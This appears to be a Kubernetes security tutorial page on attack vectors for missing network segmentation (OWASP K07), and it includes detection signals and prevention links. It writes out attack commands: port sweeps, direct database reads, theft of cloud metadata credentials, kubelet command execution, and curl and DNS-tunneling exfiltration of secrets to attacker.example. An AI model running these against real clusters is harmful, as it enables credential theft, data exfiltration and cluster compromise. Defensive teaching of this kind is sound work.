# K07: Missing Network Segmentation Controls - Attack Vectors

## Table of Contents
- [Understanding Segmentation Attack Vectors](#understanding)
- [Core Attack Flow](#core-attack-flow)
- [Common Attack Patterns](#patterns)
- [Chaining a Flat Network into Full Compromise](#chaining)

## Understanding Segmentation Attack Vectors

> **⚠ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix these issues in clusters you own or are authorised to test.

Missing segmentation is not exploited with an exotic payload. It is exploited by **reachability**: once an attacker has code running in any pod, the flat network lets ordinary connections do the rest. The initial foothold might come from a vulnerable web app, an SSRF, a poisoned dependency, or a compromised image — K07 is what happens *next*. On a segmented cluster, that foothold is boxed in. On a flat one, it inherits the reachability of the entire cluster.

The attacker's goals in this category are:
- Map the internal network — which pods, services, and datastores are reachable.
- Pivot east-west to higher-value targets (databases, admin APIs, other namespaces/tenants).
- Reach the control plane surface (API server, kubelet) and the cloud metadata endpoint.
- Establish egress for command-and-control and data exfiltration.

### Core Attack Flow

```
1. Land
   |  Code execution in one pod (app vuln, SSRF, supply chain)
   v
2. Discover
   |  Enumerate reachable pods/services, DNS, ClusterIPs, ports
   v
3. Pivot (east-west)
   |  Connect to databases, caches, internal/admin APIs, other namespaces
   v
4. Escalate
   |  Reach API server / kubelet; hit 169.254.169.254 for cloud creds
   v
5. Exfiltrate / Persist
   |  Open egress to C2, exfil data, deploy miners or backdoors
```

## Common Attack Patterns

### 1. Internal Reconnaissance and Service Discovery

On a flat network, cluster DNS and the pod CIDR hand the attacker a map for free.

```
# Cluster DNS enumerates services across ALL namespaces:
nslookup payments-db.payments.svc.cluster.local
nslookup admin-api.internal.svc.cluster.local

# Sweep the pod/service network for open ports from inside a pod:
for ip in 10.0.0.{1..254}; do
  nc -z -w1 $ip 5432 2>/dev/null && echo "$ip:5432 open (postgres)"
  nc -z -w1 $ip 6379 2>/dev/null && echo "$ip:6379 open (redis)"
done
```

**Payoff**: a full inventory of reachable services — databases, caches, brokers, admin APIs — none of which should be reachable from this pod.

### 2. Direct Datastore Access After a Foothold

The database was reachable from every pod, not just its API tier.

```
# From a compromised frontend pod, connect straight to the DB:
psql "postgres://app:S3cr3t@payments-db.payments.svc:5432/prod" -c "SELECT * FROM cards LIMIT 5;"
redis-cli -h cache.default.svc -p 6379 KEYS '*'
mongosh "mongodb://reports-db.analytics.svc:27017/prod" --eval "db.users.find()"
```

**Payoff**: bulk read, tamper, or wipe of data with no application bug — just reachability plus weak/default datastore auth.

### 3. Cross-Namespace / Cross-Tenant Pivot

Namespaces are not a network boundary, so the attacker crosses them at will.

```
# From team-a's compromised pod, reach team-b's and prod's services:
curl http://orders-api.team-b.svc.cluster.local/internal/dump
curl http://secrets-proxy.prod.svc.cluster.local/v1/creds
```

**Payoff**: one tenant's or environment's compromise reaches another's data — exactly the isolation customers assume they have.

### 4. SSRF-to-Metadata Cloud Credential Theft

Unrestricted egress makes the link-local metadata endpoint reachable from pods.

```
# Reachable from the pod because there is no egress policy:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# -> node-instance-role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/node-instance-role
# -> { "AccessKeyId": "...", "SecretAccessKey": "...", "Token": "..." }

# The stolen node credentials are then used against the cloud API:
aws s3 ls   # with the exfiltrated temporary credentials
```

**Payoff**: escalation from "one container" to the node's cloud identity — often far more privileged than the workload. Any in-app SSRF becomes cloud credential theft on a flat-egress cluster.

### 5. Reaching the Control Plane (API Server & Kubelet)

Pods can frequently route to the API server and to node kubelets.

```
# The default ServiceAccount token is mounted in the pod:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets

# A kubelet with anonymous/read access exposes pods and can exec:
curl -sk https://<node-ip>:10250/pods
curl -sk "https://<node-ip>:10250/run/<ns>/<pod>/<container>" -d "cmd=id"
```

**Payoff**: with a usable token or a permissive kubelet, reachability turns into reading secrets, executing in other pods, or cluster takeover. Segmentation that blocks pods from the kubelet port and limits API-server reach removes this path.

### 6. Unrestricted Egress for C2 and Exfiltration

Nothing stops a pod from talking to the internet.

```
# Beacon to attacker infrastructure and exfiltrate:
curl -X POST https://attacker.example/c2 -d @/etc/secrets/db-password
tar czf - /data | curl -T - https://attacker.example/loot
# DNS tunneling when only DNS egress is (accidentally) allowed:
for chunk in $(split_secret); do nslookup $chunk.exfil.attacker.example; done
```

**Payoff**: reliable command-and-control and data exfiltration. Default-deny egress with an allow-list is what closes this.

### 7. Wormable Lateral Movement

Because every pod can reach every pod, a self-propagating payload spreads without obstruction.

```
# Simplified worm loop running inside a compromised pod:
for host in $(discover_reachable_pods); do
  if exploit_or_weak_cred $host; then
     copy_payload $host && run_payload $host   # miner / backdoor
  fi
done
```

**Payoff**: cluster-wide compromise and resource hijacking (cryptomining) from a single entry point — the classic Kubernetes worm pattern that a flat network enables.

### 8. Impersonation Without mTLS

Without service identity, a service trusts whatever connects to it.

```
# No mTLS: the orders service accepts a spoofed "internal" caller:
curl http://orders.prod.svc/internal/refund \
  -H "X-Internal-Caller: billing" \
  -d '{"amount": 100000, "to": "attacker"}'
```

**Payoff**: an attacker in the cluster impersonates trusted services and abuses "internal-only" endpoints that rely on network position as their only authentication.

## Chaining a Flat Network into Full Compromise

The individual steps are unremarkable; the flat network is what lets them chain end to end.

```
App vuln in a frontend pod        -> code execution in one pod
        +
No egress policy                  -> curl 169.254.169.254 -> node cloud creds
        +
Over-privileged node role         -> read cloud storage / widen access
        =  cloud-account compromise from a single web bug
```

Another common chain, staying inside the cluster:

```
Foothold in dev namespace         -> DNS + port sweep (no default-deny)
        -> reach prod datastore across namespaces (no isolation)
        -> dump data; open egress to C2 (no egress policy)
        =  cross-environment data breach, no control-plane bug needed
```

## Detection Opportunities

| Attacker Action | Observable Signal |
|-----------------|-------------------|
| Internal port sweep | Many short-lived connections from one pod to many IPs/ports |
| Cross-namespace calls | Flows between namespaces that never normally communicate |
| Metadata access | Any pod connection to `169.254.169.254` |
| Kubelet / API probing | Pod traffic to `:10250` or unusual API-server call volume |
| Exfiltration / C2 | Egress to unknown external hosts; large outbound transfers; DNS tunneling |

These signals are only visible if you collect flow logs (CNI flow logs, mesh telemetry). A flat network with no observability hands the attacker both reachability and invisibility.

## Key Takeaways

1. **K07 is exploited by reachability, not payloads** — the foothold comes from elsewhere; the flat network is what makes it catastrophic.
2. **Discovery is free on a flat cluster** — cluster DNS and the pod CIDR map every reachable target.
3. **Egress is the escalation path** — the metadata endpoint and open internet turn a pod foothold into cloud-account theft and exfiltration.
4. **The control plane is in reach** — API server and kubelet are often just another pod-to-service connection away.
5. **No identity means impersonation** — without mTLS, network position is treated as authentication, and attackers have that position.

## Next Steps

- **[Prevention](prevention.md)**: Default-deny baselines, egress control, and mesh mTLS
- **[Examples](examples.md)**: Insecure vs. secure NetworkPolicy and isolation
- **[Kubernetes Learning Path](/learn/kubernetes)**: Continue the OWASP Kubernetes Top 10
- **[Practice](/practice)**: Apply what you've learned in hands-on exercises
